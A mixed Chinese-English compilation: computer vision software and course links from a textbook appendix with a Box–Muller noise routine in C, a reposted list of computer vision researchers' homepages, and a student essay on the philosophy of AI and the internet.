http://www.cs.unc.edu/~ccwu/siftgpu/ (Wu 2010).

SURF: Speeded Up RobustFeatures, http://www.vision.ee.ethz.ch/~surf/
(Bay, Tuyte-laars, and VanGool 2006).

FAST corner detection, http://mi.eng.cam.ac.uk/~er258/work/fast.html
(Rosten and Drum-mond 2005, 2006).

Linux binaries for afﬁneregion detectors and descriptors, as well as MATLAB ﬁles to
compute repeatability andmatching scores, 

http://www.robots.ox.ac.uk/~vgg/research/affine/

Kanade–Lucas–Tomasi featuretrackers: KLT, 
http://www.ces.clemson.edu/~stb/klt/ (Shi and Tomasi 1994);
GPU-KLT, http://cs.unc.edu/~cmzach/opensource.html (Zach,Gallup, and
 Frahm2008); Lucas–Kanade 20 Years On, http://www.ri.cmu.edu/projects/project 515.html (Baker and Matthews
 2004).
第五章：分割
高效的基于图形的分割http://people.cs.uchicago.edu/~pff/segment
(Felzenszwalb and Huttenlocher2004b).

EDISON, 边缘检测和图像追踪, 
http://coewww.rutgers.edu/riul/research/code/EDISON/
(Meer and Georgescu 2001; Comaniciu and Meer2002).

Normalized cuts segmentationincluding intervening contours,
http://www.cis.upenn.edu/~jshi/software/
(Shi and Malik 2000; Malik,Belongie, Leung et al. 2001).

Segmentation by weightedaggregation (SWA),利用加权集合的分割
http://www.cs.weizmann.ac.il/~vision/SWA (Alpert, Galun, Basri et al.2007).

第六章：基于特征的对齐和校准
Non-iterative PnP algorithm,（非迭代PnP算法） 
http://cvlab.epﬂ.ch/software/EPnP (Moreno-Noguer, Lep-etit, and Fua 2007).

Tsai Camera Calibration（相机矫正） Software, 
http://www-2.cs.cmu.edu/~rgw/TsaiCode.html (Tsai 1987).

Easy CameraCalibration Toolkit,（简易相机校准工具包）http://research.microsoft.com/en-us/um/people/zhang/
 Calib/ (Zhang 2000).

Camera Calibration Toolbox forMATLAB, 
http://www.vision.caltech.edu/bouguetj/calib doc/ ; a C version is included in OpenCV.

MATLAB functions for multipleview geometry, 

http://www.robots.ox.ac.uk/~vgg/hzbook/code/ (Hartley and Zisserman2004).

第七章：运动重建
SBA: A generic sparse bundle(稀疏束) adjustment C/C++ package basedon the Levenberg–
Marquardt algorithm, http://www.ics.forth.gr/~lourakis/sba/ (Lourakis and Argyros 2009).

Simple sparse bundleadjustment (SSBA), http://cs.unc.edu/~cmzach/opensource.html
 .

Bundler, structure from motionfor unordered image collections(无序图像集),
http://phototour.cs.washington.edu/bundler/ (Snavely, Seitz, and Szeliski 2006).

第八章:稠密运动估计
光流, http://www.cs.brown.edu/~black/code.html (Black and Anan-
dan 1996).

Optical ﬂow（光流） using total variation（全变量差） and conjugate gradientdescent（共轭梯度下降）,http://people.csail.mit.edu/celiu/OpticalFlow/
 (Liu 2009).

TV-L1 optical ﬂow on the GPU, http://cs.unc.edu/~cmzach/opensource.html
(Zach,Pock, and Bischof2007a).

elastix: atoolbox for rigid（刚性） and nonrigid（非刚性） registration of images（配准图像）,http://elastix.isi.uu.nl/
 (Klein, Staring, and Pluim 2007).

Deformable image registration（可变形的配准图像） using discreteoptimization（离散最优化）,http://www.mrf-registration.net/deformable/index.html
(Glocker, Komodakis, Tziritas et al. 2008).

第九章：图像缝合
Microsoft Research ImageCompositing Editor for stitching images,（图像拼接，图像合成）
http://research.microsoft.com/en-us/um/redmond/groups/ivm/ice/ .

第十章：计算机摄影学
HDRShop software for combiningbracketed exposures（包围式曝光） into high-dynamic range radiance images,http://projects.ict.usc.edu/graphics/HDRShop/.

Super-resolution（超分辨率） code, 
http://www.robots.ox.ac.uk/~vgg/software/SR/ (Pickup 2007;Pickup, Capel,Roberts et al. 2007, 2009).

第十一章：立体对应
StereoMatcher, standalone C++stereo matching code,
http://vision.middlebury.edu/stereo/code/ (Scharstein and Szeliski2002).

Patch-based multi-view stereosoftware (PMVS Version 2),
http://grail.cs.washington.edu/software/pmvs/ (Furukawa and Ponce 2011).

第十二章：3D重建
Scanalyze: a system foraligning and merging range data,
http://graphics.stanford.edu/software/scanalyze/ (Curless and Levoy 1996).

MeshLab: software forprocessing, editing, and visualizing unstructured 3D triangular
meshes, http://meshlab.sourceforge.net/.

VRML viewers (various) arealso a good way to visualize texture-mapped 3D models.

节 12.6.4: Whole body modeling andtracking（全身建模和追踪）

Bayesian 3D person tracking（贝叶斯3D人体追踪）, http://www.cs.brown.edu/~black/code.html (Sidenbladh,Black,
 and Fleet2000; Sidenbladh and Black 2003).

HumanEva: baseline code forthe tracking of articulated human motion,
http://vision.cs.brown.edu/humaneva/ (Sigal, Balan, and Black 2010).

节 14.1.1: Face detection（人脸检测）

Sample face detection code andevaluation tools,
http://vision.ai.uiuc.edu/mhyang/face-detection-survey.html.

节 14.1.2: Pedestrian detection（行人追踪）

A simple object detector withboosting, 
http://people.csail.mit.edu/torralba/shortCourseRLOC/boosting/boosting.html
(Hastie, Tibshirani, and Friedman 2001;Torralba, Murphy, and Freeman 2007).

Discriminatively（有区别） trained deformable（可变形） part models,http://people.cs.uchicago.edu/~pff/latent/
 (Felzenszwalb, Girshick,McAllester et al. 2010).

Upper-body detector（上身检测）, 
http://www.robots.ox.ac.uk/~vgg/software/UpperBody/ (Ferrari,Marin-Jimenez, andZisserman 2008).

2D articulated human poseestimation software, 

http://www.vision.ee.ethz.ch/~calvin/articulated_human_pose_estimation_code/ (Eichner
 and Ferrari 2009).

节 14.2.2: Active appearance and 3Dshape models

AAMtools: An active appearancemodeling toolbox,
http://cvsp.cs.ntua.gr/software/AAMtools/ (Papandreou and Maragos2008).

节 14.3: Instance recognition

FASTANN and FASTCLUSTER forapproximate k-means (AKM),
http://www.robots.ox.ac.uk/~vgg/software/ (Philbin, Chum, Isard et al. 2007).

Feature matching using fastapproximate nearest neighbors,
http://people.cs.ubc.ca/~mariusm/index.php/FLANN/FLANN (Muja and Lowe 2009).


节 14.4.1: Bag of words(词袋)

Two bag of words classiﬁers, http://people.csail.mit.edu/fergus/iccv2005/bagwords.html
(Fei-Fei and Perona 2005;Sivic, Russell, Efros et al. 2005).

Bag of features andhierarchical（分层） k-means,http://www.vlfeat.org/
 (Nist´ er and Stew´enius2006; Nowak, Jurie, and Triggs 2006).

节 14.4.2: Part-based models

A simple parts and structureobject detector, 

http://people.csail.mit.edu/fergus/iccv2005/partsstructure.html
(Fischler and Elschlager 1973; Felzenszwalband Huttenlocher 2005).

节 14.5.1: Machine learning software

Support vector machines (SVM)software (
http://www.support-vector-machines.org/SVM soft.html )
包含很多支持向量机的库, 
SVMlight http://svmlight.joachims.org/ ;
LIBSVM, http://www.csie.ntu.edu.tw/~cjlin/libsvm/(Fan, Chen,and Lin 2005);
LIBLINEAR, http://www.csie.ntu.edu.tw/~cjlin/liblinear/ (Fan,Chang, Hsieh et al.2008).

Kernel Machines: links to SVM,Gaussian processes, boosting, and other machine
learning algorithms, http://www.kernel-machines.org/software .

Multiple kernels for imageclassiﬁcation, 
http://www.robots.ox.ac.uk/~vgg/software/MKL
(Varma and Ray 2007; Vedaldi, Gulshan, Varmaet al. 2009).

附录 A.1–A.2: Matrix decompositions（矩阵分解） and linear least squares（线性最小乘）

BLAS (BasicLinear Algebra Subprograms基本线性代数子程序),
http://www.netlib.org/blas/ (Blackford,Demmel, Dongarraet al. 2002).

LAPACK (Linear Algebra（线性代数） PACKage), 
http://www.netlib.org/lapack/ (Anderson, Bai,Bischof etal. 1999).

GotoBLAS, http://www.tacc.utexas.edu/tacc-projects/.

ATLAS (Automatically TunedLinear Algebra Software),
http://math-atlas.sourceforge.net/ (Demmel, Dongarra, Eijkhoutet al. 2005).

Intel Math Kernel Library(MKL), http://software.intel.com/en-us/intel-mkl/.

AMD CoreMath Library (ACML), 
http://developer.amd.com/cpu/Libraries/acml/Pages/default.aspx .

Robust PCA code（鲁棒主成分分析）, http://www.salle.url.edu/~ftorre/papers/rpca2.html
(De la Torre and Black 2003).

Appendix A.3: Non-linear leastsquares非线性最小二乘

MINPACK, http://www.netlib.org/minpack/.

levmar: Levenberg–Marquardtnonlinear least squares algorithms, 非线性最小二乘
http://www.ics.forth.gr/~lourakis/levmar/ (Madsen, Nielsen, andTingleff 2004).

附录 A.4–A.5: Direct（直接） and iterative（迭代） sparse matrix（稀疏矩阵） solvers

SuiteSparse (variousreordering algorithms, 各种各样的重排算法CHOLMOD) and SuiteSparse QR,http://www.cise.ufl.edu/research/sparse/SuiteSparse/
 (Davis 2006, 2008).

PARDISO (iterative and sparsedirect solution), 
http://www.pardiso-project.org/.

TAUCS (sparse direct,iterative, out of core, preconditioners),
http://www.tau.ac.il/~stoledo/taucs/ .

HSL Mathematical SoftwareLibrary, http://www.hsl.rl.ac.uk/index.html .

Templatesfor the solution of linear systems（线性系统解决问题的模板）,http://www.netlib.org/linalg/html
 templates/Templates.html (Barrett, Berry, Chan et al.1994). Download the PDF for instructions（说明） on how to get the software.

ITSOL,MIQR, and other sparsesolvers,
http://www-users.cs.umn.edu/~saad/software/ (Saad 2003).

ILUPACK, http://www-public.tu-bs.de/~bolle/ilupack/ .

附录 B: Bayesian modeling and inference（贝叶斯建模和推断）

Middleburysource code for MRF minimization（隐马尔科夫随机场最小化）,http://vision.middlebury.edu/MRF/code/
 (Szeliski, Zabih, Scharsteinet al. 2008).

C++ code for efﬁcient beliefpropagation for early vision,
http://people.cs.uchicago.edu/~pff/bp/ (Felzenszwalb andHuttenlocher 2006).

FastPD MRF optimization（最优化） code, 
http://www.csd.uoc.gr/~komod/FastPD (Komodakisand Tziritas2007a; Komodakis, Tziritas, and Paragios 2008)


算法 C.1 Calgorithm for Gaussian random noise generation, using theBox–Mullertransform.
C描述的利用Box–Muller 变换产生高斯随机噪声
double urand()
{
return ((double)rand()) / ((double) RAND MAX);
}
void grand(double& g1, double& g2)
{
#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif // M_PI
double n1 = urand();
double n2 = urand();
double x1 = n1 + (n1 == 0); /* guardagainst log(0) */
double sqlogn1 = sqrt(-2.0 * log (x1));
double angl = (2.0 * M PI) * n2;
g1 = sqlogn1 * cos(angl);
g2 = sqlogn1 * sin(angl);
}


高斯噪声的产生。许多基本的软件包产生一些不同的随机的噪声(例如 运行在unix上的rand())，但是并不是所有的都有高斯随机噪声发生器。计算一个离散随机常量，你可以用Box–Mullertransform (Box and Muller 1958)，他的c代码在算法C.1中给出了，注意这个运行结果是返回一对随机变量。相关的产生高斯随机变量的方由Thomas, Luk, Leong et al. (2007)提出。

伪彩色产生。在很多应用中，很方便给图像加上标记（或者给图像特征比如线）。一个最简单的方式就是给不同的标记不同的颜色。在我的工作中，我发现用RGB立体色彩系给不同的标记赋予标准均匀的色彩是很方便的。
对于每一个（非消极）标记值，considerthe bits as being split among the three color channel，例如对于一个比特值为9的值，
这个值可以被标记为RGBRGBRGB，获得三基色中的每一种颜色值后，颠倒比特值，结果是低位的比特值变化的最快。
实际上，对于一个八比特的颜色通道，这个比特值的颠倒可以被存在一个表或者一个存储提前计算好的记录有由标记值向伪彩色的改变的完整表。
图 8.16 显示了这样一个伪彩色绘制的例子.

GPU实现

GPU的出现，可以处理像素着色和计算着色，导致了实时应用的快速计算机视觉算法的发展，例如，分割，追踪，立体和运动估计（(Pock, Unger, Cremerset al. 2008; Vineet and Narayanan 2008; Zach,Gallup, and Frahm 2008）。一个好的资源来学习这些算法就是CVPR 2008 上关于Visual Computer Visionon GPUs的workshop。
http://www.cs.unc.edu/~jmf/Workshop_on_Computer_Vision_on_GPU.html他的论文可以在CVPR2008的会议集的DVD中找到。额外的关于GPU算法资源包括GPGPU网址和小组讨论http://gpgpu.org/还有OpenVIDIAWeb
 site, http://openvidia.sourceforge.net/index.php/OpenVIDIA

C.3 PPT和讲稿
正如我在前言中提到的，我希望提供和书中材料相一致的PPT，直到这些全部准备好，你最好的方式去看我在华盛顿大学上课时的PPT，和一写相关课程中用到的教案。
这里是一些这样的课程列表：
UW 455:Undergraduate Computer Vision,
http://www.cs.washington.edu/education/courses/455/.

UW576:Graduate Computer Vision,
http://www.cs.washington.edu/education/courses/576.

StanfordCS233B: Introduction to Computer Vision,
http://vision.stanford.edu/teaching/cs223b/.

MIT6.869: Advances in Computer Vision,
http://people.csail.mit.edu/torralba/courses/6.869/6.869.computervision.htm.

Berkeley CS 280: Computer Vision, 
http://www.eecs.berkeley.edu/~trevor/CS280.html

UNC COMP776: Computer Vision, 
http://www.cs.unc.edu/~lazebnik/spring10.

Middlebury CS 453: Computer Vision,
http://www.cs.middlebury.edu/~schar/courses/cs453-s10/.

Related courses have also been taught onthe topic of Computational Photography, e.g.,

CMU 15-463: Computational Photography, http://graphics.cs.cmu.edu/courses/15-463/.

MIT 6.815/6.865: Advanced ComputationalPhotography,
http://stellar.mit.edu/S/course/6/sp09/6.815

Stanford CS 448A: Computational photographyon cell phones,
http://graphics.stanford.edu/courses/cs448a-10/.

SIGGRAPH courses on ComputationalPhotography, 

http://web.media.mit.edu/~raskar/photo/.

这里还有一些最好的关于各种计算机视觉主题的在线讲稿，例如：belief propagation and graph cuts，它们在UW-MSR Course of Vision Algo-rithmshttp://www.cs.washington.edu/education/courses/577/04sp/

C.4 参考文献：
这本的所有参考文献在这本书的网站上，一个几乎所有的计算机视觉的出版物都引用的更全面的部分注解书目由Keith Price维http://iris.usc.edu/Vision-Notes/bibliography/contents.html.
这里还有一个可搜索的计算机图形学的参考书目http://www.siggraph.org/publications/bibliography/另外技术论文比较好的资源是GoogleScholar
 和 CiteSeerX。






    转自：http://www.cnblogs.com/Rick-w/archive/2012/04/14/2446921.html
       以下链接是本人整理的关于计算机视觉（ComputerVision, CV）相关领域的网站链接，其中有CV牛人的主页，CV研究小组的主页，CV领域的paper,代码，CV领域的最新动态，国内的应用情况等等。打算从事这个行业或者刚入门的朋友可以多关注这些网站，多了解一些CV的具体应用。搞研究的朋友也可以从中了解到很多牛人的研究动态、招生情况等。总之，我认为，知识只有分享才能产生更大的价值，真诚希望下面的链接能对朋友们有所帮助。

（1）googleResearch； 
http://research.google.com/index.html 

（2）MIT博士，汤晓欧学生林达华； 
http://people.csail.mit.edu/dhlin/index.html

（3）MIT博士后Douglas Lanman；
http://web.media.mit.edu/~dlanman/

（4）opencv中文网站； 
http://www.opencv.org.cn/index.php/%E9%A6%96%E9%A1%B5

（5）Stanford大学vision实验室； 
http://vision.stanford.edu/research.html 

（6）Stanford大学博士崔靖宇； 
http://www.stanford.edu/~jycui/ 
（7）UCLA教授朱松纯； 
http://www.stat.ucla.edu/~sczhu/ 
（8）中国人工智能网； 
http://www.chinaai.org/ 
（9）中国视觉网； 
http://www.china-vision.net/ 
（10）中科院自动化所； 
http://www.ia.cas.cn/
（11）中科院自动化所李子青研究员； 
http://www.cbsr.ia.ac.cn/users/szli/ 

（12）中科院计算所山世光研究员； 
http://www.jdl.ac.cn/user/sgshan/ 
（13）人脸识别主页； 
http://www.face-rec.org/ 
（14）加州大学伯克利分校CV小组；http://www.eecs.berkeley.edu/Research/Projects/CS/vision/
（15）南加州大学CV实验室； 
http://iris.usc.edu/USC-Computer-Vision.html

（16）卡内基梅隆大学CV主页；http://www.cs.cmu.edu/afs/cs/project/cil/ftp/html/vision.html
（17）微软CV研究员Richard Szeliski；http://research.microsoft.com/en-us/um/people/szeliski/

（18）微软亚洲研究院计算机视觉研组； 
http://research.microsoft.com/en-us/groups/vc/

（19）微软剑桥研究院ML与CV研究组； 
http://research.microsoft.com/en-us/groups/mlp/default.aspx
（20）研学论坛； 
http://bbs.matwav.com/ 
（21）美国Rutgers大学助理教授刘青山； 
http://www.research.rutgers.edu/~qsliu/ 

（22）计算机视觉最新资讯网； 
http://www.cvchina.info/ 
（23）运动检测、阴影、跟踪的测试视频下载；http://apps.hi.baidu.com/share/detail/18903287

（24）香港中文大学助理教授王晓刚； 
http://www.ee.cuhk.edu.hk/~xgwang/ 

(25)香港中文大学多媒体实验室（汤晓鸥）; 
http://mmlab.ie.cuhk.edu.hk/ 
(26)U.C. San Diego. computer vision;http://vision.ucsd.edu/content/home
(27)CVonline; 
http://homepages.inf.ed.ac.uk/rbf/CVonline/

(28)computer vision software;

http://peipa.essex.ac.uk/info/software.html

(29)Computer Vision Resource;
http://www.cvpapers.com/

(30)computer vision research groups;http://peipa.essex.ac.uk/info/groups.html

(31)computer vision center;

http://computervisioncentral.com/cvcnews
(32)浙江大学图像技术研究与应用（ITRA）团队：http://www.dvzju.com/
(33)自动识别网：http://www.autoid-china.com.cn/
(34)清华大学章毓晋教授：http://www.tsinghua.edu.cn/publish/ee/4157/2010/20101217173552339241557/20101217173552339241557_.html
(35)顶级民用机器人研究小组Porf.Gary领导的Willow Garage:http://www.willowgarage.com/
(36)上海交通大学图像处理与模式识别研究所：http://www.pami.sjtu.edu.cn/
(37)上海交通大学计算机视觉实验室刘允才教授：http://www.visionlab.sjtu.edu.cn/
(38)德克萨斯州大学奥斯汀分校助理教授Kristen Grauman ：http://www.cs.utexas.edu/~grauman/
(39)清华大学电子工程系智能图文信息处理实验室（丁晓青教授）：http://ocrserv.ee.tsinghua.edu.cn/auto/index.asp
(40)北京大学高文教授：http://www.jdl.ac.cn/htm-gaowen/
(41)清华大学艾海舟教授：http://media.cs.tsinghua.edu.cn/cn/aihz
(42)中科院生物识别与安全技术研究中心：http://www.cbsr.ia.ac.cn/china/index%20CH.asp
(43)瑞士巴塞尔大学 Thomas Vetter教授：http://informatik.unibas.ch/personen/vetter_t.html
(44)俄勒冈州立大学 Rob Hess博士：http://blogs.oregonstate.edu/hess/
(45)深圳大学 于仕祺副教授：http://yushiqi.cn/
(46)西安交通大学人工智能与机器人研究所：http://www.aiar.xjtu.edu.cn/
(47)卡内基梅隆大学研究员Robert T. Collins:http://www.cs.cmu.edu/~rcollins/home.html#Background
(48)MIT博士Chris Stauffer:http://people.csail.mit.edu/stauffer/Home/index.php
(49)美国密歇根州立大学生物识别研究组(Anil K. Jain教授)：http://www.cse.msu.edu/rgroups/biometrics/
(50)美国伊利诺伊州立大学Thomas S. Huang:http://www.beckman.illinois.edu/directory/t-huang1
(51)武汉大学数字摄影测量与计算机视觉研究中心：http://www.whudpcv.cn/index.asp
(52)瑞士巴塞尔大学Sami Romdhani助理研究员：http://informatik.unibas.ch/personen/romdhani_sami/
(53)CMU大学研究员Yang Wang:http://www.cs.cmu.edu/~wangy/home.html
(54)英国曼彻斯特大学Tim Cootes教授：http://personalpages.manchester.ac.uk/staff/timothy.f.cootes/
(55)美国罗彻斯特大学教授Jiebo Luo:http://www.cs.rochester.edu/u/jluo/
(56)美国普渡大学机器人视觉实验室：https://engineering.purdue.edu/RVL/Welcome.html
(57)美国宾利州立大学感知、运动与认识实验室：http://vision.cse.psu.edu/home/home.shtml
(58)美国宾夕法尼亚大学GRASP实验室：https://www.grasp.upenn.edu/
(59)美国内达华大学里诺校区CV实验室：http://www.cse.unr.edu/CVL/index.php
(60)美国密西根大学vision实验室：http://www.eecs.umich.edu/vision/index.html
(61)University of Massachusetts(麻省大学),视觉实验室：http://vis-www.cs.umass.edu/index.html
(62)华盛顿大学博士后Iva Kemelmacher:http://www.cs.washington.edu/homes/kemelmi
(63)以色列魏茨曼科技大学Ronen Basri:http://www.wisdom.weizmann.ac.il/~ronen/index.html
(64)瑞士ETH-Zurich大学CV实验室：http://www.vision.ee.ethz.ch/boostingTrackers/index.htm
(65)微软CV研究员张正友：http://research.microsoft.com/en-us/um/people/zhang/
(66)中科院自动化所医学影像研究室：http://www.3dmed.net/
(67)中科院田捷研究员：http://www.3dmed.net/tian/
(68)微软Redmond研究院研究员Simon Baker:http://research.microsoft.com/en-us/people/sbaker/
(69)普林斯顿大学教授李凯：http://www.cs.princeton.edu/~li/

(70)普林斯顿大学博士贾登：http://www.cs.princeton.edu/~jiadeng/

(71)牛津大学教授Andrew Zisserman：
http://www.robots.ox.ac.uk/~az/

(72)英国leeds大学研究员Mark Everingham:http://www.comp.leeds.ac.uk/me/

(73)英国爱丁堡大学教授Chris William:
http://homepages.inf.ed.ac.uk/ckiw/

(74)微软剑桥研究院研究员John Winn:
http://johnwinn.org/

(75)佐治亚理工学院教授Monson H.Hayes：http://savannah.gatech.edu/people/mhayes/index.html
(76)微软亚洲研究院研究员孙剑：http://research.microsoft.com/en-us/people/jiansun/

(77)微软亚洲研究院研究员马毅：http://research.microsoft.com/en-us/people/mayi/

(78)英国哥伦比亚大学教授David Lowe:
http://www.cs.ubc.ca/~lowe/

(79)英国爱丁堡大学教授Bob Fisher:
http://homepages.inf.ed.ac.uk/rbf/

(80)加州大学圣地亚哥分校教授Serge J.Belongie:http://cseweb.ucsd.edu/~sjb/

(81)威斯康星大学教授Charles R.Dyer:
http://pages.cs.wisc.edu/~dyer/

(82)多伦多大学教授Allan.Jepson:
http://www.cs.toronto.edu/~jepson/

(83)伦斯勒理工学院教授Qiang Ji: 
http://www.ecse.rpi.edu/~qji/ 
(84)CMU研究员Daniel Huber: 
http://www.ri.cmu.edu/person.html?person_id=123

(85)多伦多大学教授：David J.Fleet:
http://www.cs.toronto.edu/~fleet/

(86)伦敦大学玛丽女王学院教授Andrea Cavallaro:http://www.eecs.qmul.ac.uk/~andrea/
(87)多伦多大学教授Kyros Kutulakos:
http://www.cs.toronto.edu/~kyros/

(88)杜克大学教授Carlo Tomasi: 
http://www.cs.duke.edu/~tomasi/
(89)CMU教授Martial Hebert:
http://www.cs.cmu.edu/~hebert/

(90)MIT助理教授Antonio Torralba:
http://web.mit.edu/torralba/www/

(91)马里兰大学研究员Yasel Yacoob:
http://www.umiacs.umd.edu/users/yaser/

(92)康奈尔大学教授Ramin Zabih: 
http://www.cs.cornell.edu/~rdz/
(93)CMU博士田渊栋: 
http://www.cs.cmu.edu/~yuandong/ 
(94)CMU副教授Srinivasa Narasimhan:http://www.cs.cmu.edu/~srinivas/

(95)CMU大学ILIM实验室：http://www.cs.cmu.edu/~ILIM/
(96)哥伦比亚大学教授Sheer K.Nayar:http://www.cs.columbia.edu/~nayar/
(97)三菱电子研究院研究员Fatih Porikli ：http://www.porikli.com/
(98)康奈尔大学教授Daniel Huttenlocher：http://www.cs.cornell.edu/~dph/
(99)南京大学教授周志华：http://cs.nju.edu.cn/zhouzh/index.htm
(100)芝加哥丰田技术研究所助理教授Devi Parikh:http://ttic.uchicago.edu/~dparikh/index.html
(101)瑞士联邦理工学院博士后Helmut Grabner:http://www.vision.ee.ethz.ch/~hegrabne/#Short_CV
(102)香港中文大学教授贾佳亚：http://www.cse.cuhk.edu.hk/~leojia/index.html
(103)南洋理工大学副教授吴建鑫：http://c2inet.sce.ntu.edu.sg/Jianxin/index.html
(104)GE研究院研究员李关：http://www.cs.unc.edu/~lguan/
(105)佐治亚理工学院教授Monson Hayes:http://savannah.gatech.edu/people/mhayes/
(106)图片检索国际会议VOC(微软剑桥研究院组织):http://pascallin.ecs.soton.ac.uk/challenges/VOC/
(107)机器视觉开源处理库汇总：http://archive.cnblogs.com/a/2217609/
(108)布朗大学教授Benjamin Kimia:
http://www.lems.brown.edu/kimia.html

(109)数据堂-图像处理相关的样本数据：http://www.datatang.com/data/list/602026/p1
(110)东软基于CV的汽车辅助驾驶系统：http://www.neusoft.com/cn/solutions/1047/
(111)马里兰大学教授Rema Chellappa:http://www.cfar.umd.edu/~rama/
(112)芝加哥丰田研究中心助理教授DeviParikh：http://ttic.uchicago.edu/~dparikh/index.html
(113)宾夕法尼亚大学助理教授石建波：http://www.cis.upenn.edu/~jshi/










完成于2014年3月

文章大纲1. 人工智能的哲学问题2. 信息技术正深入渗透着我们的生活3. 因特网给人类社会带来的哲学问题4. 开源软件的协作

我在很早的时候，也许是从小学3年级开始，就开始跟大人们，哥哥们玩电脑游戏了，那时候很流行的是Country Strike，Red Alert. 小时候对电脑的好奇，在一定程度上造就了，我晚些时候的专业选择，我高考完了之后，在所有学校的志愿单上，都果断的填写了信息技术方面的专业，于是乎，在之后的日子里，我在计算机这条道路上越走越远。也终于明白，之前充满神秘魔幻的游戏世界，就是代码堆砌起来的数学逻辑。整个计算机体系的大厦，建立在前人们，缜密的数学逻辑之中，建立在无数完美的设计之中。先今我们所使用的各种软件，从桌面端的QQ，你能想象它后台的服务器支持几亿人同时在线收发讯息不出问题。到银行的ATM机上安装的嵌入式系统或者支持百万人同时在线购买的淘宝，它们提供7*24小时无间断的安全服务，这时候，你我有没有被它们的设计者——程序员，计算机科学家们所感动，从软件工程的角度来讲，这些系统就是杰出的艺术品，是人类智慧的结晶。
在上大学期间，我听了学校老师讲述的一门选修课——黄帝内经彰显的和谐文化与智慧，当时听老师讲，德国数学家莱布尼兹，受到中国太极的启发，发明了二进制的数学学说。我突然明白，原来学科之间也是有着普遍联系的。后来上了高年级，学了人工智能，觉的很有趣，智能化的终端渗透到了我们生活的各个方面，所以对于人工智能我先来谈谈：
1. 人工智能的哲学问题
计算机从其诞生到现在才50年,因特网( Internet )的产生不过20来年,熟悉计算机的人们都知道摩尔定律,硬件芯片的运算速度每18个月翻一番,而且其复杂程度越来越高。IBM的深蓝电脑也战胜了国际象棋大师，随之而来的哲学问题就是——计算机能否在人工智能领域，替代人类？电影工作者们在影片《黑客帝国》中探究了这一哲学问题。
故事梗概：电影原名为Matrix，意思是母体或子宫，在影片中是指一个由电脑所制造的虚拟世界。在2199年左右，电脑人战胜了人类，统治了整个地球。它们把所有的人都浸泡在营养液中，在人身上接通许多电线，输入由电脑控制的电流刺激，模拟出人的全部感觉、经验、思维和想象。每一个人从生到死，都生活在由电脑所制造的活生生的虚拟世界中，谁也不知道自己全部的生活竟是一个幻觉，谁也无法从这场大梦中觉醒。这就是无所不在又不为人知的Matrix。但是以默菲斯为首的反抗者，仍然在地心坚持战斗，他们要破坏Matrix，戳穿这个总体性的幻觉，使全人类获得觉悟。他们进入虚拟世界，以黑客的手段来进行破坏。在多次失败之后，他们发现了黑客尼奥是他们唯一的希望，（相当于系统中的bug，只有他能瘫痪Matrix）是全人类的救世主。默菲斯等反抗战士最终说服了 尼奥 ，并帮助他回到了真实世界。 尼奥 抛弃了他在虚拟世界中被规定的角色，以尼奥为名开始了恢复真实世界的工作。经过艰苦的学习过程，尼奥首先恢复了其真实的感觉和运动的机能，在模拟Matrix的其它虚拟世界中，他学会了中国功夫，领悟了虚拟世界的虚幻性。然后他们进入虚拟世界与电脑人特工展开了惊心动魄的搏斗，最终解放了人类，恢复了真实的生活，使人类与机器世界和平相处。
《黑客帝国》系列把“现实的荒漠”这一命题做到了极致——机器设备的扩张不可阻挡，人类没有第三条出路:要么在数字化的系统里被数字化，要么被系统抛离到边缘。博德里拉1995年的著作《完美的罪行》中有这样的警句:“影像不再让人想象现实，因为它就是现实。影像也不再能让人幻想实在的东西，因为它就是虚拟的实在。”“在实时尽情放纵地生活吧——直接在屏幕上生活和受苦吧。在实时思索吧——你们的思维直接被电子计算机译成电码。在实时干你的革命吧——不是在大街上，而是在录音室里。”这些句子也许可以当作《黑客帝国》的注脚。
时光流逝，大概是在大学二年级左右，大家不约而同的使用上了，智能手机，从刚开始的诺基亚的塞班系统，到现在红遍全球的IOS或者android系统，智能移动终端正摸摸的渗透着我们的生活，每天起床，我们的第一件事情不是起床，刷牙。而是查看一下手机，有没有什么新的回复，或者讯息。每当吃饭，当菜品上桌的时候，我们的第一件事情就是拍照片，跟朋友们分享。于是我又有了如下的思考：
2. 信息技术正深入渗透着我们的生活
如今,因特网( Internet 也称互联网) 已经融入了我们的生活,它对人类社会产生了深刻的影响。事实是,因特网已取得了惊人的发展:目前全世界已有190个国家和地区的3亿多人在使用它,而且这一人数仍然保持着近似指数增长方式。原来只为科学研究、教育而开设的因特网,开始向各个行业、社会公众提供多样化的咨询和服务,并且形成当今世界各国竞相发展的IT 产业,从而使得整个社会的生产、生活方式正发生着巨大的变化。在经济领域它突出了知识、信息的价值,使商贸信息得以广泛、迅速地传递,顾客、销售商和生产厂家之间能更便利地沟通,消费者在很短的时间内就可以获得所需商品。电子商务、网络经济也因此而蓬勃兴起。在政治领域,它使政府与公众间的沟通更为方便,有利于充分发挥公众的民主权利,加强公众对政府的监督,提高政府机构的办公效率、科学管理水平及决策水平。在军事领域,它可以使最高指挥系统迅速、全面地掌握敌我情况,加强全军的快速反应和协调的能力。在教科文、医疗、卫生领域,它方便人们查询、利用各种信息,进行科研合作、远程教学、医疗诊断。在日常生活领域,它向人们提供电子银行、电子报刊、电子教室、电子图书馆、电子会议、电子邮政、电子论坛,可以实现电子购物、虚拟旅游、交互式娱乐,等等。与此同时,人们的社会交往方式也正发生着令人惊异的变化。在现实社会中,我们一直习惯于面对面地同他人交往和沟通,即同步交流,交往活动常依赖于物理时间和空间,其范围是比较狭窄的。然而以因特网为基础,人们的交往方式常常为异步交流,在那里—切都简化成了符号,人与人之间的交往不再受时空的限制,甚至可以说它不需要任何社会关系基础。也就是说,因特网上的交流活动在深度和广度上都是现实世界无法比拟的。无论我们承认与否,因特网正以特有的规律与速度把社会各部门、行业以及各国、各地区以它的方式联成一个整体,形成了所谓的“网络世界”。现实的社会生活将在很大程度上依赖因特网,可以说,离开了它我们的生活就会陷入瘫痪,甚至于发生混乱。
科学技术是第一生产力,科技革命是历史进步的源动力。历史表明,任何—种革命性的科学技术的诞生,都将极大地推动社会生产力的发展,因特网的出现为我们社会的发展提供了很好的机遇。例如,随着信息技术、网络技术的不断完善和在生产中的应用, —种新型的“知识经济”正在形成,科学技术也得以及时而有力地向全世界的偏远地区辐射,那些生活在“世外桃源”的人们也能受惠于现代科技;社会生产率得以极大提高,社会管理方式也正发生着引人注目的变化,等等。
